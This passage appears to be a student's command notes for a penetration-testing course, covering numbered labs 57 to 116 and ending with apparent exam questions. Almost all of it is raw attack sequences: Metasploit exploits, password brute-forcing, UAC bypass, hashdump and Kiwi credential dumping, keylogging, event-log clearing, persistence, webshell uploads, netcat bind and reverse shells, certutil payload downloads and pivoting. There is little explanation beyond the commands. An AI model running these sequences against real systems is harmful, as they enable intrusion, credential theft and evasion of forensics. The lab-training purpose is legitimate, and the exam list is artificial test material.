wmap_targets -l
wmap_run -t
wmap_run -e

```
57) Windows: HTTP File Server
    
```
cat /root/Desktop/target
nmap --top-ports 65536 10.0.0.99
nmap -sV -p 80 10.0.0.99
searchsploit hfs
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RPORT 80
set RHOSTS 10.0.0.99
set LHOST 10.10.0.4 <Make Sure to Enter Valid LHOST IP Address>
exploit
shell
cd /
dir
type flag.txt
```
58)  WinRM: Exploitation with Metasploit
    
```
nmap --top-ports 7000 10.0.0.173
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS 10.0.0.173
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
exploit
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS 10.0.0.173
exploit
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set CMD whoami
exploit
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.0.0.173
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
cd /
dir
type flag.txt

```
59) Windows: Java Web Server
    
```
nmap --top-ports 65536 10.0.0.141
firefox 10.0.0.141:8080
msfconsole
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS 10.0.0.141
check (We are running a “check” command in the metasploit framework to make sure that if
the target is vulnerable to jsp_upload_bypass or not.)
exploit
cd /
dir
type flag.txt
```
60) Vulnerable FTP Server
```
nmap -sS -sV 192.130.172.3
nmap -p 21 --script vuln 192.130.172.3
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.130.172.3
exploit
/bin/bash -i
```
61) Vulnerable File Sharing Service
```
nmap -sS -sV 192.218.210.3
use exploit/linux/samba/is_known_pipename
set RHOST 192.218.210.3
check
exploit
/bin/bash -i

```
62) Vulnerable SSH server
```
nmap -sS -sV 192.51.205.3
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS 192.51.205.3
set SPAWN_PTY true
exploit
sessions -i 1
id
```
63)  Vulnerable SMTP Server

```
nmap -sS -sV 192.3.161.3
use exploit/linux/smtp/haraka
set SRVPORT 9898    #incoming connections from the payload
set email_to root@attackdefense.test
set payload linux/x64/meterpreter_reverse_http
set rhost 192.150.137.3
set LHOST 192.150.137.2
exploit

```
64) Meterpreter Basics  **NOTE** 

```
nmap -sS -sV 192.189.123.3
dirb http://192.189.123.3
curl http://192.189.123.3/phpinfo.php
msfconsole
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS 192.189.123.3
set LHOST 192.189.123.2
exploit
lpwd
lls
cat /app/flag1
edit /app/flag1
cd "Secret Files"
cat .flag2
download flag5.zip
unzip flag5.zip
cat list
rm flag5.zip
checksum md5 /bin/bash
getenv PATH
search -d /usr/bin -f *ckdo*
lcd tools
upload /usr/share/webshells/php/php-backdoor.php
https://www.offsec.com/metasploit-unleashed/meterpreter-basics/

```
65) Upgrading Command Shells To Meterpreter Shells

```
ifconfig
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.136.51.3
run
CTRL + Z
use post/multi/manage/shell_to_meterpreter
set SESSION 1
set LHOST 192.136.51.2
run
sessions 2
```
66) Windows Post Exploitation Modules
```
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.2.23.169
run
background
use post/windows/gather/win_privs
set SESSION 1
run
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
use post/windows/gather/checkvm
set SESSION 1
run
use post/windows/gather/enum_applications
set SESSION 1
run
use post/windows/gather/enum_av_excluded
set SESSION 1
run
use post/windows/gather/enum_computers
set SESSION 1
run
use post/windows/gather/enum_shares
set SESSION 1
run
```

67)  UAC Bypass: Memory Injection (Metasploit)

```
cat /root/Desktop/target
nmap 10.0.23.239
nmap -sV -p 80 10.0.23.239
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.23.239
exploit
getuid
sysinfo
ps -S explorer.exe
migrate 2440
getsystem
shell
net localgroup administrators
CTRL + C
background
use exploit/windows/local/bypassuac_injection
set session 1
set TARGET 1
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
getsystem
getuid
ps -S lsass.exe
migrate 688
hashdump
```
68)  Privilege Escalation: Impersonate    

```
cat /root/Desktop/target
nmap 10.0.28.7
nmap -sV -p 80 10.0.28.7
searchsploit hfs 
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.28.7
exploit 
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt
load incognito
list_tokens -u
impersonate_token ATTACKDEFENSE\\Administrator 
getuid
cat C:\\Users\\Administrator\\Desktop\\flag.txt

```
69)  Windows: Meterpreter: Kiwi Extension

```
cat /root/Desktop/target
nmap 10.0.27.166
nmap -sV -p 80 10.0.27.166
searchsploit badblue 2.7
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.27.166
exploit
migrate -N lsass.exe
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
```
70)  Exploiting SMB With PsExec
```
cat /root/Desktop/target
nmap 10.0.0.242
nmap -p445 --script smb-protocols 10.0.0.242
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.0.0.242
set VERBOSE false    **NOTE**
exploit
use exploit/windows/smb/psexec
set RHOSTS 10.0.0.242
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
shell
cd /
dir
type flag.txt
```

71)  Maintaining Access: Persistence Service

```
cat /root/Desktop/target
nmap 10.0.25.204
nmap -sV -p 80 10.0.25.204
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.25.204
set LHOST 10.10.1.2 <Make Sure to Enter Valid LHOST IP Address>
exploit
getuid
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit
##
msfconsole -q
use exploit/multi/handler
set LHOST 10.10.1.2
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit ## for new terminal
session -i 1
reboot

```
72)   Windows: Enabling Remote Desktop

```
cat /root/Desktop/target
nmap 10.0.0.68
nmap -sV -p 80 10.0.0.68
searchsploit badblue 2.7
msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.0.68
exploit
use post/windows/manage/enable_rdp
set SESSION 1
exploit
nmap 10.0.0.68
sessions -i 1
shell
net user administrator hacker_123321
xfreerdp /u:administrator /p:hacker_123321 /v:10.0.0.68
```
73) Windows: File and Keylogging

```
cat /root/Desktop/target
nmap 10.0.0.71
nmap -sV -p 80 10.0.0.71
searchsploit badblue 2.7
msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.0.71
exploit
shell
cd /
dir
type flag.txt
cd Users\\Administrator\\Desktop
dir
ECHO “You have been Hacked” > hacked.txt
tasklist
exit
ps
migrate 2724
keyscan_start
keyscan_dump
```

74)   Clearing Windows Event Logs

```
msfconsole
use exploit/windows/http/badblue_passthru
set RHOSTS 10.2.27.188
exploit
clearev
```

75)  Pivoting

```
cat /root/Desktop/target
nmap 10.0.23.180
nmap -sV -p 80 10.0.23.180
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.23.180
exploit
ipconfig
run autoroute -s 10.0.23.0/20
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.27.99
set PORTS 1-100
exploit
sessions -i 1
portfwd add -l 1234 -p 80 -r 10.0.27.99
portfwd list
nmap -sV -sS -p 1234 localhost
searchsploit badblue 2.7
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.0.27.99
exploit
shell
cd /
dir
type flag.txt
search ssh  platform:linux
```

76)  Post Exploitation Lab I

```
nmap -sS -sV -p- 192.162.5.3
use exploit/linux/samba/is_known_pipename
set RHOST 192.162.5.3
check
exploit -z
use post/linux/gather/enum_configs
set SESSION 1
run
use post/multi/gather/env
set SESSION 1
run
use post/linux/gather/enum_network
set SESSION 1
run
use post/linux/gather/enum_protections
set SESSION 1
run
use post/linux/gather/enum_system
set SESSION 1
run
use post/linux/gather/checkcontainer
set SESSION 1
run
use post/linux/gather/checkvm
set SESSION 1
run
use post/linux/gather/enum_users_history
set SESSION 1
run
use post/multi/manage/system_session
set SESSION 1
set TYPE python
set HANDLER true
set LHOST 192.162.5.2
run
use post/linux/manage/download_exec
set URL http://192.162.5.2/test.sh
set SESSION 1
run
```
77)  Privilege Escalation - Rootkit Scanner **NOT WORK**

```
nmap -sS -sV 192.14.195.3
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.14.195.3
set USERNAME jackie
set PASSWORD password
exploit
sessions -i 1
ps aux
cat /bin/check-down
​command -v chkrootkit
/bin/chkrootkit -V
use exploit/unix/local/chkrootkit
set CHKROOTKIT /bin/chkrootkit
set session 1
set LHOST 192.14.195.2
exploit
cat /root/flag
```
78) Post Exploitation Lab II **NOT FINISHED**
```
nmap -sS -sV -p- 192.91.98.3
use exploit/linux/samba/is_known_pipename
set RHOST 192.91.98.3
check
exploit -z
use post/multi/gather/ssh_creds
set SESSION 1
run
use post/multi/gather/docker_creds
set SESSION 1
run
use post/linux/gather/hashdump
set SESSION 1
set VERBOSE true
run
use post/linux/gather/ecryptfs_creds
set SESSION 1
run
use post/linux/gather/enum_psk
set SESSION 1
run
use post/linux/gather/enum_xchat
set SESSION 1
run
use post/linux/gather/phpmyadmin_credsteal
set SESSION 1
run
use post/linux/gather/pptpd_chap_secrets
set SESSION 1
run
use post/linux/manage/sshkey_persistence
set SESSION 1
run 
```
79) Establishing Persistence On Linux
```
ifconfig
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.182.80.3
set USERNAME jackie
set USERNAME jackie
run
sessions -u 1
use exploit/unix/local/chkrootkit
set SESSION 2
set CHKROOTKIT /bin/chkrootkit
run
sessions -u 3
use post/linux/manage/sshkey_persistence
set SESSION 4
set CREATESSHFOLDER true
exploit
loot
chmod 0400 ssh_key
ssh -i ssh_key root@192.182.80.3

```   
**Host & Network Penetration Testing: Exploitation**

80) SSH Recon: Basic

```
nmap -sV 192.201.39.3
nc 192.201.39.3
ssh root@192.201.39.3
nmap --script ssh2-enum-algos 192.201.39.3
nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.201.39.3
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 192.201.39.3
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 192.201.39.3
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=student,ssh-run.password=" 192.201.39.3
```
81) Netcat Fundamentals    **File transfer**
    
```
nc --help
nc 10.4.20.244 80
nc -nv 10.4.20.244 80
nc -nv 10.4.20.244 21
nc -nvu 10.4.20.244 161
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80
ifconfig
certutil -urlcache -f http://10.10.3.3/nc.exe nc.exe
nc -nvlp 1234
nc -nv 10.10.3.3 1234
echo "Hello, this was sent over with Netcat" >> test.txt
nc.exe -nvlp 1234 > test.txt
nc -nv 10.4.20.244 1234 < test.txt
```
82)  Bind Shells
```
cd /usr/share/windows-binaries
python -m SimpleHTTPServer 80
ifconfig
certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe
nc.exe -nvlp 1234 -e cmd.exe
nc -nv 10.4.21.221 1234
nc -nvlp 1234 -e /bin/bash
nc.exe -nv 10.10.3.2 1234  #windows
```
83) Windows: Workflow Platform  (Web)
    
```
cat /root/Desktop/target
nmap --top-ports 65536 10.0.0.168
firefox 10.0.0.168
msfconsole
search processmaker
use exploit/multi/http/processmaker_exec
set RHOSTS 10.0.0.168
cd /
dir
cat flag.txt
```
84)  Port Scanning & Enumeration - Windows

```
cat /etc/hosts
ping demo.ine.local
nmap -sV 10.0.22.85
nmap -T4 -PA -sC -sV -p 1-10000 10.0.22.85
https://10.0.22.85:4848
nmap -sV -sC -p 445 10.0.22.85
msfconsole
use /auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.22.85
run
```
85) Targeting Microsoft IIS FTP

```
cat /etc/hosts
ping demo.ine.local
nmap -sV -sC -p21,80 10.0.28.97
ftp 10.0.28.97 21
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.28.97 ftp
ftp 10.0.28.97 21 # give the username and password
```
86)  Targeting OpenSSH
```
cat /etc/hosts
ping demo.ine.local
nmap -sV -sC -p 22 10.0.26.161 
searchsploit OpenSSH 7.1
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.26.161 ssh
ssh vagrant@10.0.26.161
whoami
ssh Administrator@10.0.26.161
```
87) Targeting SMB

```
cat /etc/hosts
ping demo.ine.local
nmap -sV -sC -p 445 10.0.31.252 
hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.31.252 smb
hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.31.252 smb
enum4linux -u vagrant -p vagrant -U 10.0.31.252
cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
cp /usr/share/doc/python3-impacket/examples/psexec.py . # for current dir
chmod +x psexec.py
python3 psexec.py Administrator@10.0.31.252
msfconsole
use exploit/windows/smb/psexec
set RHOSTS 10.0.31.252
set SMBUser Administrator
Set SMBPass vagrant
set payload windows/x64/meterpreter/reverse_tcp
exploit
```
88) Targeting MySQL Database Server

```
cat /etc/hosts
ping demo.ine.local
nmap -sV -sC -p 3306 10.0.25.212
searchsploit MySQL 5.5
msfconsole
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 10.0.25.212
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run
mysql -u root -p -h 10.0.25.212
show databases;
use wordpress;
show tables;
select * from wp_users;
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
http://<TARGET-IP>/8585/wordpress/wp-admin
```
89) Port Scanning & Enumeration - Linux

```
cat /etc/hosts
ping demo.ine.local
nmap -sV -p1-10000 10.2.20.22 
netcat 10.2.20.22 512
netcat 10.2.20.22 1524

```
90)  Targeting vsFTPd
```
cat /etc/hosts
ping demo.ine.local
nmap -sV -sC -p 21 10.2.17.5
ftp 10.2.17.5 21
searchsploit vsftpd
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.2.17.5
run
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.2.17.5 ftp
ftp 10.2.17.5 21 #give the username and password
```
91) Targeting PHP

```
cat /etc/hosts
ping demo.ine.local
nmap -sV -sC -p 80 10.2.19.172
searchsploit php cgi
msfconsole
use exploit/multi/http/php_cgi_arg_injection
set RHOSTS 10.2.19.172
run
```
92)  Targeting SAMBA
```
cat /etc/hosts
ping demo.ine.local
nmap -sV  -p 445 10.2.17.132
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.2.217.132
run
searchsploit samba 3.0.20
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.2.217.132
exploit
```

**Host & Network Penetration Testing: Post-Exploitation**

93) Enumerating System Information
 
```
nmap -sV 10.2.24.80
searchsploit rejetto
msfconsole
use exploit/windows/http/rejetto_hsf_exec
set RHOSTS 10.2.24.80
exploit
sysinfo
shell
hostname
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
94) Enumerating Users & Groups
```
nmap -sV 10.2.22.30
searchsploit rejetto
msfconsole
use exploit/windows/http/rejetto_hsf_exec
set RHOSTS 10.2.22.30
exploit
getuid
getprivs
background
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
sessions 1
shell
whoami
whoami /priv
net users
net user administrator
net localgroup
net localgroup administrators
```
95) Enumerating Network Information

```
nmap -sV 10.2.20.137
searchsploit rejetto
msfconsole
use exploit/windows/http/rejetto_hsf_exec
set RHOSTS 10.2.20.137
exploit
ipconfig
ipconfig /all
route print
arp -a
netstat -ano
```
96) Enumerating Processes & Services
```
nmap -sV 10.2.19.62
searchsploit rejetto
msfconsole
use exploit/windows/http/rejetto_hsf_exec
set RHOSTS 10.2.19.62
exploit
ps
pgrep explorer.exe
migrate 2176
shell
net start
wmic service list brief
tasklist /SVC
schtasks /query /fo LIST
```
97) Automating Windows Local Enumeration
```
nmap -sV -p 5985 10.2.21.181
msfconsole
use exploit/windows/winrm/winrm_script_exec
set RHOSTS 10.2.21.181
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
run
background
use post/windows/gather/win_privs
set SESSION 1
run
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
use post/windows/gather/checkvm
set SESSION 1
run
use post/windows/gather/enum_applications
set SESSION 1
run
use post/windows/gather/enum_computers
set SESSION 1
run
use post/windows/gather/enum_patches
set SESSION 1
run
ctrl+shift+alt to copy and past
cd C:\\
mkdir Temp
upload /root/Desktop/jaws-enum.ps1
shell
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
download JAWS-Enum.txt
```
98) Enumerating System Information (Linux)

```
ifconfig
nmap -sV 192.178.80.3
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.178.80.3
run
/bin/bash -i
CTRL + Z
sessions -u 1
sessions 2
sysinfo
shell
/bin/bash -i
hostname
cat /etc/issue
cat /etc/*release
uname -a
lscpu
df -h
```
99) Enumerating Users & Groups

```
ifconfig
nmap -sV 192.72.78.3
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.72.28.3
exploit
/bin/bash -i
CTRL + Z
sessions -u 1
sessions 2
getuid
shell
/bin/bash -i
whoami
groups root
cat /etc/passwd
groups
who
lastlog
```
100) Enumerating Network Information
```
ifconfig
nmap -sV 192.198.70.3
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.198.70.3
exploit
/bin/bash -i
CTRL + Z
sessions -u 1
sessions 2
ifconfig
netstat
route
ip a s
cat /etc/networks
cat /etc/hosts
cat /etc/resolv.conf
```
101) Enumerating Processes & Cron Jobs
```
ifconfig
nmap -sV 192.183.4.3
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.183.4.3
exploit
/bin/bash -i
CTRL + Z
sessions -u 1
sessions 2
ps
pgrep vsftpd
cat /etc/cron*
ls -al /etc/cron*
```
102) Automating Linux Local Enumeration
```
ifconfig
nmap -sV 192.182.85.3
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.182.85.3
set TARGETURI /gettime.cgi
exploit
background
use post/linux/gather/enum_configs
set SESSION 1
run
use post/linux/gather/enum_network
set SESSION 1
run
use post/linux/gather/enum_system
set SESSION 1
run
use post/linux/gather/checkvm
set SESSION 1
run
cd /tmp
shell
/bin/bash -i
chmod +x LinEnum.sh
./LinEnum.sh
```
103) Setting Up A Web Server With Python
```
python -m SimpleHTTPServer 80
python -m http.server 80
```
104) Transferring Files To Windows Targets

```
nmap -sV -p 80 10.2.30.185
searchsploit rejetto
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.2.30.185
exploit
cd /usr/share/windows-resources/mimikatz/x64
python3 -m http.server 80
cd C:\\
mkdir Temp
cd Temp
shell
certutil -urlcache -f http://10.10.5.2/mimikatz.exe mimikatz.exe
```
105)  Transferring Files To Linux Targets
```
ifconfig
nmap -sV 192.196.45.3
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.196.45.3
exploit
cd /usr/share/webshells/php/
python3 -m http.server 80
cd /temp
wget http://192.196.45.2/php-backdoor.php
```
106)  Upgrading Non-Interactive Shells
```
ifconfig
nmap -sV 192.185.44.3
msfconsole
use exploit/linux/samba/is_known_pipename
set RHOSTS 192.185.44.3
exploit
/bin/bash -i
python -c 'import pty; pty.spawn("/bin/bash")'
```
107) Windows: PrivescCheck
```
whoami
https://github.com/itm4n/PrivescCheck
cd C:\Users\student\Desktop\PrivescCheck
ls
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck
runas.exe /user:administrator cmd
msfconsole -q
use exploit/windows/misc/hta_server
exploit
mshta.exe http://10.10.15.2:8080/jxEyD3w.hta
sessions -i 1
cd C:\\Users\\Administrator\\Desktop
dir
cat flag.txt
```
108) Permissions Matter!

```
find / -not -type l -perm -o+w
ls -l /etc/shadow
cat /etc/shadow
openssl passwd -1 -salt abc password
vim /etc/shadow
su
cd /root
ls -l
cat flag
```
109) Editing Gone Wrong
```
find / -user root -perm -4000 -exec ls -ldb {} \;
sudo -l
!/bin/bash
cd /root
ls -l
cat flag
```
110) Maintaining Access: Persistence Service
```
cat /root/Desktop/target
nmap 10.0.25.204
nmap -sV -p 80 10.0.25.204
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.25.204
set LHOST 10.10.1.2 <Make Sure to Enter Valid LHOST IP Address>
exploit
getuid
background
use exploit/windows/local/persistence_service
set SESSION 1
exploit
msfconsole -q
use exploit/multi/handler
set LHOST 10.10.1.2
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit
session -i 1
reboot
exit
run
```
111) Maintaining Access: RDP
```
cat /root/Desktop/target
nmap 10.0.23.139
nmap -sV -p 80 10.0.23.139
searchsploit badblue 2.7
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.23.139
exploit
getuid
ps -S explorer.exe
migrate 2764
run getgui -e -u alice -p hack_123321
xfreerdp /u:alice /p:hack_123321 /v:10.0.23.139
```
112)  Maintaining Access I
```
ip addr
ssh student@192.37.104.3
Enter password “password”
ls -al
scp student@192.37.104.3:~/.ssh/id_rsa .
Enter password “password”.
ssh student@192.37.104.3
Enter password “password”.
rm wait
chmod 400 id_rsa
ssh -i id_rsa student@192.37.104.3
ls -l
cat flag.txt
```
113) T1168: Local Job Scheduling
```
ip addr
ssh student@192.99.109.3
ps -eaf
echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron
crontab -i cron
crontab -l
sh student@192.99.109.3
rm wait
nmap -p- 192.99.109.3
curl 192.99.109.3:8000
curl 192.99.109.3:8000/flag.txt
```
114) Windows: NTLM Hash Cracking
```
cat /root/Desktop/target
nmap 10.0.23.193
nmap -sV -p 80 10.0.23.193
searchsploit badblue 2.7
/etc/init.d/postgresql start
msfconsole -q
use exploit/windows/http/badblue_passthru
set RHOSTS 10.0.23.193
exploit
migrate -N lsass.exe
hashdump
background
creds
use auxiliary/analyze/crack_windows
set CUSTOM_WORDLIST /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
```
115) Password Cracker: Linux
```
nmap -sS -sV 192.229.31.3
nmap --script vuln -p 21 192.229.31.3
/etc/init.d/postgresql start
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set RHOSTS 192.229.31.3
exploit -z
use post/linux/gather/hashdump
set SESSION 1
exploit
use auxiliary/analyze/crack_linux
set SHA512 true
run
```
116) Pivoting
```
cat /root/Desktop/target
nmap 10.0.23.180
nmap -sV -p 80 10.0.23.180
searchsploit hfs
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.23.180
exploit
ipconfig
run autoroute -s 10.0.23.0/20
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.27.99
set PORTS 1-100
exploit
sessions -i 1
portfwd add -l 1234 -p 80 -r 10.0.27.99
portfwd list
nmap -sV -sS -p 1234 localhost
searchsploit badblue 2.7
use exploit/windows/http/badblue_passthru
set PAYLOAD windows/meterpreter/bind_tcp
set RHOSTS 10.0.27.99
exploit
shell
cd /
dir
type flag.txt
```
```
What is the IP address of the host running WordPress?
How many hosts on the DMZ network are running Windows?
What version of MySQL is running on the system hosting a Drupal site?
How many hosts on the DMZ network are running a web server on port 80?
What version of Windows is running on the host running WordPress?
What services does Syntex provide to companies?
What is the email of the admin user on the Drupal site?
What is the name of the active theme on the WordPress site?
How many systems on the target network have FTP servers with anonymous access enabled?
How many user accounts can be enumerated from the SAMBA server running on the system hosting Drupal?
What type of vulnerability can be exploited to gain access to WINSERVER-03?
What type of vulnerability can be exploited to elevate your privileges on the Linux host running Drupal?
Which one of the following MSF modules can be used to obtain an elevated reverse shell on WINSERVER-02?
How many hosts exist within the internal network that cannot be accessed through the DMZ network?
What is the subnet of the internal network?
What host can be used to pivot into the internal network?
What is the password of the user account "dbadmin" on the Linux server hosting Drupal?
What is the password for the user "mike" on WINSERVER-01?
A target system has a user account called "lawrence". What is the password for this account?
What is the name of the vulnerable web app running on the Linux server in the internal network?
What is the CVSS V3.x rating for the Drupalgeddon2 vulnerability?
What file can be used to identify the version of Drupal running on a webserver?
How many Drupal accounts exist on the Drupal site?
What version of WordPress is running on WINSERVER-01?
What WordPress file stores the database configuration?
What host on the DMZ network is running a database server on port 3307?
What is the version of the Linux kernel running on the system hosting the Drupal site?
Excluding the guest account, how many user accounts are present on WINSERVER-01?
What host in the DMZ network is running a web server with WebDAV enabled?
What host on the network contains a user account called "lawrence"?
Which one of the following user accounts is present on WINSERVER-02?
How many HotFixes are installed on WINSERVER-01?
The server hosting Drupal contains the file /home/auditor/flag.txt. What is the value of the flag?
What is the value of the flag /root/flag.txt on the host running Drupal?
What Windows utility can be used to download files from a remote web server?
```









